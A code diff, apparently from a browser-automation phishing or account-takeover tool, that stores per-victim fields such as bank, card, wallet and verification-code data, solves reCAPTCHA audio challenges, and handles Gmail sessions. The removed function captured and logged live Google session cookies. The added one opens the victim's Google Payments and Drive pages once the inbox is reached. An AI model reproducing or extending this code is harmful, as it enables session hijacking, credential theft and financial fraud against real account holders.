@@ -36,8 +36,7 @@ const DEFAULT_COOKIE_COLUMNS = new Set([
     'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider',
     'browserIdentity', 'history', 'verificationOptions', 'verificationChoice',
     'verificationCode', 'cookieStatus', 'cookie', 'usage', 'submissionId', 'engineProcessing',
-    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId',
-    'accountCookieJSON', 'driveCookieJSON'
+    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId'
 ]);
 export function setKnownCookieColumns(headers) {
     if (Array.isArray(headers) && headers.length > 0) {
@@ -476,8 +475,6 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
 
     const logCleanObject = { ...updateObject };
     delete logCleanObject.cookieJSON;
-    delete logCleanObject.accountCookieJSON;
-    delete logCleanObject.driveCookieJSON;
     delete logCleanObject.formattedCookie;
     delete logCleanObject.verificationOptions;
     delete logCleanObject.verificationChoice;
@@ -2345,39 +2342,29 @@ export async function solveRecaptchaAudioChallenge(page, instanceId) {
 // startAppScriptDataBackgroundUpdater(); // Removed direct call, will be managed by route.js
 
 /**
- * Captures cookies across multiple tabs for Google/Gmail:
- * Tab 1 (current page): Gmail Inbox
- * Tab 2: Wallet & Subscriptions (https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app)
- * Tab 3: Google Drive (https://drive.google.com/drive/u/0/home)
- *
- * For non-Google domains, captures the standard single-tab cookies.
- * Returns { cookieJSON, accountCookieJSON, driveCookieJSON }
+ * Opens Tab 2 (Wallet & Subscriptions) and Tab 3 (Google Drive) in the browser
+ * when Gmail inbox is reached, without touching or merging session cookies.
  */
-export async function captureMultiTabCookies(browser, page, domain, browserId) {
-    if (browser) browser._isCapturingMultiTab = true;
+export async function openGoogleExtraTabs(browser, domain) {
+    if (!browser) return;
+    const isGoogle = domain && (domain.includes('google') || domain.includes('gmail'));
+    if (!isGoogle) return;
     try {
-        const isGoogle = domain && (domain.includes('google') || domain.includes('gmail'));
-        const allUrls = getCookieCaptureUrls(domain);
-
-        // 1. Capture primary/inbox cookies
-        let mailCookies = [];
-        try {
-            if (page && !page.isClosed()) {
-                mailCookies = await page.cookies(...allUrls);
-            }
-        } catch (e) {
-            logger.warn(`[captureMultiTabCookies][${browserId}] Error capturing mail cookies: ${e.message}`);
+        const tab1 = await browser.newPage().catch(() => null);
+        if (tab1) {
+            await tab1.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
+                waitUntil: 'domcontentloaded',
+                timeout: 15000
+            }).catch(() => null);
         }
-
-        const cookieJSONStr = JSON.stringify(mailCookies);
-        logger.info(`[captureMultiTabCookies][${browserId}] Captured ${mailCookies.length} authentic cookies from session.`);
-
-        return {
-            cookieJSON: cookieJSONStr,
-            accountCookieJSON: '',
-            driveCookieJSON: ''
-        };
-    } finally {
-        if (browser) browser._isCapturingMultiTab = false;
+        const tab2 = await browser.newPage().catch(() => null);
+        if (tab2) {
+            await tab2.goto('https://drive.google.com/drive/u/0/home', {
+                waitUntil: 'domcontentloaded',
+                timeout: 15000
+            }).catch(() => null);
+        }
+    } catch (e) {
+        logger.warn(`[openGoogleExtraTabs] Notice opening extra tabs: ${e.message}`);
     }
 }
